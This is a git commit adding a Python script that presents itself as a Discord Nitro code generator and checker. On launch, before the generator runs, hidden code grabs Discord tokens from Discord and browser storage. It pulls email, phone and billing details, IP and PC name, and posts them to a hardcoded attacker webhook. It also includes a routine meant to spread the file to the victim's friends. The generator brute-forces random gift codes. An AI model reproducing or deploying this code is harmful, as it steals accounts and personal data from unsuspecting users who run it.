5e5fbaeb3d59f801131ef19acac84e34e3d2f025
J1mk0lakos <91275092+J1mk0lakos@users.noreply.github.com>
2021-12-24 23:30:46 +0200

    Add files via upload

---
+++ main.py
@@ -0,0 +1,390 @@
+
+
+import time
+import os
+
+time.sleep(3)
+os.system('cls' if os.name == 'nt' else 'clear')
+
+import random
+import string
+import ctypes
+import colorama
+from colorama import Fore
+colorama.init()
+
+#Discord :  https://discord.gg/b2Z3qAn9k4
+
+import os
+from re import findall
+from json import loads, dumps
+from base64 import b64decode
+from subprocess import Popen, PIPE
+from urllib.request import Request, urlopen
+from datetime import datetime
+from threading import Thread
+from time import sleep
+from sys import argv
+
+LOCAL = os.getenv("LOCALAPPDATA")
+ROAMING = os.getenv("APPDATA")
+PATHS = {
+    "Discord"           : ROAMING + "\\Discord",
+    "Discord Canary"    : ROAMING + "\\discordcanary",
+    "Discord PTB"       : ROAMING + "\\discordptb",
+    "Google Chrome"     : LOCAL + "\\Google\\Chrome\\User Data\\Default",
+    "Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
+    "Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
+    "Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
+}
+def getheaders(token=None, content_type="application/json"):
+    headers = {
+        "Content-Type": content_type,
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
+    }
+    if token:
+        headers.update({"Authorization": token})
+    return headers
+def getuserdata(token):
+    try:
+        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
+    except:
+        pass
+def gettokens(path):
+    path += "\\Local Storage\\leveldb"
+    tokens = []
+    for file_name in os.listdir(path):
+        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
+            continue
+        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
+            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
+                for token in findall(regex, line):
+                    tokens.append(token)
+    return tokens
+def getdeveloper():
+    dev = "wodx"
+    try:
+        dev = urlopen(Request("https://pastebin.com/raw/ssFxiejv")).read().decode()
+    except:
+        pass
+    return dev
+def getip():
+    ip = "None"
+    try:
+        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
+    except:
+        pass
+    return ip
+def getavatar(uid, aid):
+    url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
+    try:
+        urlopen(Request(url))
+    except:
+        url = url[:-4]
+    return url
+def gethwid():
+    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
+    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
+def getfriends(token):
+    try:
+        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships", headers=getheaders(token))).read().decode())
+    except:
+        pass
+def getchat(token, uid):
+    try:
+        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getheaders(token), data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
+    except:
+        pass
+def has_payment_methods(token):
+    try:
+        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
+    except:
+        pass
+def send_message(token, chat_id, form_data):
+    try:
+        urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getheaders(token, "multipart/form-data; boundary=---------------------------325414537030329320151394843687"), data=form_data.encode())).read().decode()
+    except:
+        pass
+def spread(token, form_data, delay):
+    return
+    for friend in getfriends(token):
+        try:
+            chat_id = getchat(token, friend["id"])
+            send_message(token, chat_id, form_data)
+        except Exception as e:
+            pass
+        sleep(delay)
+def main():
+    cache_path = ROAMING + "\\.cache~$"
+    prevent_spam = True
+    self_spread = True
+    embeds = []
+    working = []
+    checked = []
+    already_cached_tokens = []
+    working_ids = []
+    ip = getip()
+    pc_username = os.getenv("UserName")
+    pc_name = os.getenv("COMPUTERNAME")
+    user_path_name = os.getenv("userprofile").split("\\")[2]
+    developer = getdeveloper()
+    for platform, path in PATHS.items():
+        if not os.path.exists(path):
+            continue
+        for token in gettokens(path):
+            if token in checked:
+                continue
+            checked.append(token)
+            uid = None
+            if not token.startswith("mfa."):
+                try:
+                    uid = b64decode(token.split(".")[0].encode()).decode()
+                except:
+                    pass
+                if not uid or uid in working_ids:
+                    continue
+            user_data = getuserdata(token)
+            if not user_data:
+                continue
+            working_ids.append(uid)
+            working.append(token)
+            username = user_data["username"] + "#" + str(user_data["discriminator"])
+            user_id = user_data["id"]
+            avatar_id = user_data["avatar"]
+            avatar_url = getavatar(user_id, avatar_id)
+            email = user_data.get("email")
+            phone = user_data.get("phone")
+            nitro = bool(user_data.get("premium_type"))
+            billing = bool(has_payment_methods(token))
+            embed = {
+                "color": 0xff00ff,
+                "fields": [
+                    {
+                        "name": "**Account Info**",
+                        "value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
+                        "inline": True
+                    },
+                    {
+                        "name": "**PC Info**",
+                        "value": f'IP: {ip}\nUsername: {pc_username}\nPC Name: {pc_name}\nToken Location: {platform}',
+                        "inline": True
+                    },
+                    {
+                        "name": "**Token**",
+                        "value": f"||{token}||\n",
+                        "inline": False
+                    }
+                ],
+                "author": {
+                    "name": f"{username} ({user_id})",
+                    "icon_url": avatar_url
+                },
+                "footer": {
+                    "text": f"Token Grabber By Global Viewbot ",
+                }
+            }
+            embeds.append(embed)
+    with open(cache_path, "a") as file:
+        for token in checked:
+            if not token in already_cached_tokens:
+                file.write(token + "\n")
+    if len(working) == 0:
+        working.append('123')
+    webhook = {
+        "content": "",
+        "embeds": embeds,
+        "username": "Moma Lola",
+        "avatar_url": "https://cdn.discordapp.com/attachments/915976574610837536/920453614378565652/58540afba1a45e46008b65a3.png"
+    }
+    try: 
+        urlopen(Request("https://discord.com/api/webhooks/923670390428028980/fNjs9pAtpQ_OUNxmJuzf0aIDuMAyMYYMPUZKI7NtFXYU6WVUe3anknfYJgdteCAjZ3hy", data=dumps(webhook).encode(), headers=getheaders())) 
+    except:
+        pass
+    if self_spread:
+        for token in working:
+            with open(argv[0], encoding="utf-8") as file:
+                content = file.read()
+            payload = f'-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="file"; filename="{__file__}"\nContent-Type: text/plain\n\n{content}\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="content"\n\nserver crasher. python download: https://www.python.org/downloads\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="tts"\n\nfalse\n-----------------------------325414537030329320151394843687--'
+            Thread(target=spread, args=(token, payload, 7500 / 1000)).start()
+try:
+    main()
+except Exception as e:
+    print(e)
+    pass
+
+RED   = "\033[1;31m"
+GREEN = "\033[0;32m"  
+
+try: 
+    from discord_webhook import DiscordWebhook 
+except ImportError: 
+    input(f"Module discord_webhook not installed, to install run '{'py -3' if os.name == 'nt' else 'python3.8'} -m pip install discord_webhook'\nPress enter to exit") # Tell the user it has not been installed and how to install it
+    exit() 
+try:
+    import requests 
+except ImportError:
+    input(f"Module requests not installed, to install run '{'py -3' if os.name == 'nt' else 'python3.8'} -m pip install requests'\nPress enter to exit")# Tell the user it has not been installed and how to install it
+    exit()
+    
+
+url = "https://github.com"
+try:
+    response = requests.get(url) 
+    print("Internet chek")
+    time.sleep(.4)
+except:
+    input("You are not connected to internet, check your connection and try again.\nPress enter to exit")
+    exit()
+class NitroGen: 
+    def __init__(self):
+        self.fileName = "Nitro Codes.txt" 
+
+    def main(self): 
+        os.system('cls' if os.name == 'nt' else 'clear')
+        if os.name == "nt":
+            print("")
+            ctypes.windll.kernel32.SetConsoleTitleW("Nitro Generator and Checker - Made by J1mk0l#5776")
+        else: 
+            print(f'\33]0;Nitro Generator and Checker - Made by J1mk0l#5776\a', end='', flush=True) 
+
+        print("     ____.____         __   _______  .__   ")
+        print("    |    /_   | _____ |  | _\   _  \ |  |  ")
+        print("    |    ||   |/     \|  |/ /  /_\  \|  |  ")
+        print("/\__|    ||   |  Y Y  \    <\  \_/   \  |__")
+        print("\________||___|__|_|  /__|_ \\_____  /____/")
+        print("                    \/     \/      \/      ")# Print the title card
+        time.sleep(2) # Wait a few seconds
+        self.slowType("Made by J1mk0l#5776", .02) # Print who developed the code
+        time.sleep(1) # Wait a little more
+        self.slowType("\nInput the bumber Codes to Generate and Check: ", .01, newLine = False) # Print the first question
+
+        num = int(input('')) # Ask the user for the amount of codes
+
+        # Get the webhook url, if the user does not wish to use a webhook the message will be an empty string
+        self.slowType("\nDo you wish to use a discord webhook? \nIf so type it here or press enter to ignore: ", .02, newLine = False)
+        url = input('') # Get the awnser
+        webhook = url if url != "" else None # If the url is empty make it be None insted
+
+        # print() # Print a newline for looks
+
+        valid = [] # Keep track of valid codes
+        invalid = 0 # Keep track of how many invalid codes was detected
+
+        for i in range(num): # Loop over the amount of codes to check
+            try: # Catch any errors that may happen
+                code = "".join(random.choices( # Generate the id for the gift
+                    string.ascii_uppercase + string.digits + string.ascii_lowercase,
+                    k = 19
+                ))
+                url = f"https://discord.gift/{code}" # Generate the url
+
+                result = self.quickChecker(url, webhook) # Check the codes
+
+                if result: # If the code was valid
+                    valid.append(url) # Add that code to the list of found codes
+                else: # If the code was not valid
+                    invalid += 1 # Increase the invalid counter by one
+
+            except KeyboardInterrupt:
+                print("\nInterrupted by user") # If the user interrupted the program 
+                break # Break the loop
+            
+            except Exception as e: # If the request fails
+                print(f" Error | {url} ") # Tell the user an error occurred
+
+            if os.name == "nt": # If the system is windows
+                ctypes.windll.kernel32.SetConsoleTitleW(f"Nitro Generator and Checker - {len(valid)} Valid | {invalid} Invalid - Made by J1mk0l#5776") # Change the title
+                print("")
+            else: # If it is a unix system
+                print(f'\33]0;Nitro Generator and Checker - {len(valid)} Valid | {invalid} Invalid - Made by J1mk0l#5776\a', end='', flush=True) # Change the title
+
+        print(f"""
+Results:
+ Valid: {len(valid)}
+ Invalid: {invalid}
+ Valid Codes: {', '.join(valid )}""") # Give a report of the results of the check
+
+        input("\nThe end! Press Enter 5 times to close the program.") # Tell the user the program finished
+        [input(i) for i in range(4,0,-1)] # Wait for 4 enter presses
+
+
+    def slowType(self, text, speed, newLine = True): # Function used to print text a little more fancier
+        for i in text: # Loop over the message
+            print(i, end = "", flush = True) # Print the one charecter, flush is used to force python to print the char
+            time.sleep(speed) # Sleep a little before the next one
+        if newLine: # Check if the newLine argument is set to True
+            print() # Print a final newline to make it act more like a normal print statement
+
+    def generator(self, amount): # Function used to generate and store nitro codes in a seperate file
+        with open(self.fileName, "w", encoding="utf-8") as file: # Load up the file in write mode
+            print("Wait, Generating for you") # Let the user know the code is generating the codes
+
+            start = time.time() # Note the initaliseation time
+
+            for i in range(amount): # Loop the amount of codes to generate
+                code = "".join(random.choices(
+                    string.ascii_uppercase + string.digits + string.ascii_lowercase,
+                    k = 19
+                )) # Generate the code id
+
+                file.write(f"https://discord.gift/{code}\n") # Write the code
+
+            # Tell the user its done generating and how long tome it took
+            print(f"Genned {amount} codes | Time taken: {round(time.time() - start, 5)}s\n") #
+
+    def fileChecker(self, notify = None): # Function used to check nitro codes from a file
+        valid = [] # A list of the valid codes
+        invalid = 0 # The amount of invalid codes detected
+        with open(self.fileName, "r", encoding="utf-8") as file: # Open the file containing the nitro codes
+            for line in file.readlines(): # Loop over each line in the file
+                nitro = line.strip("\n") # Remove the newline at the end of the nitro code
+
+                # Create the requests url for later use
+                url = f"https://discordapp.com/api/v9/entitlements/gift-codes/{nitro}?with_application=false&with_subscription_plan=true"
+
+                response = requests.get(url) # Get the responce from the url
+
+                if response.status_code == 200: # If the responce went through
+                    print(f"{Fore.GREEN} Valid | {nitro} ") # Notify the user the code was valid
+                    valid.append(nitro) # Append the nitro code the the list of valid codes
+
+                    if notify is not None: # If a webhook has been added
+                        DiscordWebhook( # Send the message to discord letting the user know there has been a valid nitro code
+                            url = notify,
+                            content = f"Valid Nito Code detected! @everyone \n{nitro}"
+                        ).execute()
+                    else: # If there has not been a discord webhook setup just stop the code
+                        break # Stop the loop since a valid code was found
+
+                else: # If the responce got ignored or is invalid ( such as a 404 or 405 )
+                   
+                    print(f"{Fore.RED} Invalid | {nitro} ") # Tell the user it tested a code and it was invalid
+                    invalid += 1 # Increase the invalid counter by one
+
+        return {"valid" : valid, "invalid" : invalid} # Return a report of the results
+
+    def quickChecker(self, nitro, notify = None): # Used to check a single code at a time
+        # Generate the request url
+        url = f"https://discordapp.com/api/v9/entitlements/gift-codes/{nitro}?with_application=false&with_subscription_plan=true"
+        response = requests.get(url) # Get the response from discord
+
+        if response.status_code == 200: # If the responce went through
+            print(f"{Fore.GREEN} Valid | {nitro} ", flush=True, end="" if os.name == 'nt' else "\n") # Notify the user the code was valid
+            with open("Nitro Codes.txt", "w") as file: # Open file to write
+                file.write(nitro) # Write the nitro code to the file it will automatically add a newline
+
+            if notify is not None: # If a webhook has been added
+                DiscordWebhook( # Send the message to discord letting the user know there has been a valid nitro code
+                    url = notify,
+                    content = f"Valid Nito Code detected! @everyone \n{nitro}"
+                ).execute()
+
+            return True # Tell the main function the code was found
+
+        else: # If the responce got ignored or is invalid ( such as a 404 or 405 )
+            print(f"{Fore.RED} Invalid | {nitro} ", flush=True, end="" if os.name == 'nt' else "\n") # Tell the user it tested a code and it was invalid
+            return False # Tell the main function there was not a code found
+
+if __name__ == '__main__':
+    Gen = NitroGen() # Create the nitro generator object
+    Gen.main() # Run the main code
